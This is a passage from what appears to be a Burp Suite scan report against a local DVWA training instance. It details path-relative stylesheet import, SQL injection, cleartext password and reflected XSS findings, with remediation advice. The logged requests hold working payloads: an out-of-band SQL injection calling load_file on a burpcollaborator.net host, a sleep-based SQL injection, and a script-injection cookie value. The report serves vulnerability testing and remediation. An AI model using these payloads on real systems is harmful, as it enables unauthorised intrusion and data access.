<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/setup.php HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sa7mb82kags626lneok15gar3o<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5449<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/setup.php<span class="HIGHLIGHT">/lvvmu6/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sa7mb82kags626lneok15gar3o<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5449<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/setup.php/lvvmu6/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sa7mb82kags626lneok15gar3o<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:43 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 5449<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Setup :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*&lt;/tit<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="17">17.&nbsp;http://localhost:7878/dvwa/vulnerabilities/brute/</span>
<br><a class="PREVNEXT" href="#16">Previous</a>
&nbsp;<a class="PREVNEXT" href="#18">Next</a>
<br>
<span class="BODH1" id="17.1">17.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00100200_sqlinjection">SQL injection</a></span>
<br><a class="PREVNEXT" href="#16.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The <b>username</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\95cduoirvjb0n4e5bkbu5rybz25wttlhck0bn1bq.burpcollaborator.net\\tae'))+'</b> was submitted in the username parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the username parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the username parameter. The application took <b>20020</b> milliseconds to respond to the request, compared with <b>5</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.</span>
<h2>Remediation detail</h2>
<span class="TEXT">The application should handle errors gracefully and prevent SQL error messages from being returned in responses. </span>
<h2>Issue background</h2>
<span class="TEXT"><p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p></span>
<h2>Remediation background</h2>
<span class="TEXT"><p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul></span>
<h2>References</h2>
<span class="TEXT"><ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/?username=admin<span class="HIGHLIGHT">'%2b(select%20load_file('%5c%5c%5c%5c95cduoirvjb0n4e5bkbu5rybz25wttlhck0bn1bq.burpcollaborator.net%5c%5ctae'))%2b'</span>&amp;password=password&amp;Login=Login HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=ap4arrppot1iqv12i85aggu69h<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/brute/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:42:23 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4241<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br></span></div>
<h2>Collaborator DNS interaction</h2>
<span class="TEXT">The Collaborator server received a DNS lookup of type AAAA for the domain name <b>95cduoirvjb0n4e5bkbu5rybz25wttlhck0bn1bq.burpcollaborator.net</b>.<br><br> The lookup was received from IP address 49.231.70.82 at 2022-Mar-11 07:42:30 UTC.</span><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/?username=admin<span class="HIGHLIGHT">'</span>&amp;password=password&amp;Login=Login HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=disl6p7r3n0558s2rmg189hcnp<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/brute/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:40:13 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 644<br>Connection: close<br>Content-Type: text/html; charset=UTF-8<br><br>&lt;br /&gt;<br>&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught mysqli_sql_exception: <span class="HIGHLIGHT">You have an error in your SQL syntax</span>; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5f4dcc3b5aa765d61d8327deb882cf99'' at line 1 in C:\xampp\htdocs\DVWA\vulnerabilities\brute\source\lo<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/?username=admin<span class="HIGHLIGHT">''</span>&amp;password=password&amp;Login=Login HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=disl6p7r3n0558s2rmg189hcnp<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/brute/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:40:13 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4241<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 4</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/?username=admin<span class="HIGHLIGHT">'%2b(select*from(select(sleep(20)))a)%2b'</span>&amp;password=password&amp;Login=Login HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=disl6p7r3n0558s2rmg189hcnp<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/brute/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 4</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:40:13 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4241<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="17.2">17.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00300100_cleartextsubmissionofpassword">Cleartext submission of password</a></span>
<br><a class="PREVNEXT" href="#17.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://localhost:7878/dvwa/vulnerabilities/brute/</li></ul>The form contains the following password field:<ul><li>password</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/117.html">CAPEC-117: Interception</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/brute/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sq50nqtaoh5btrj1ps2s04s7a4<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:52 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4189<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/h2&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="#" method="GET"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Username:&lt;br /&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="17.3">17.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#17.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#17.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/brute/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ozpd3'&gt;&lt;script&gt;alert(1)&lt;/script&gt;coqwz</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
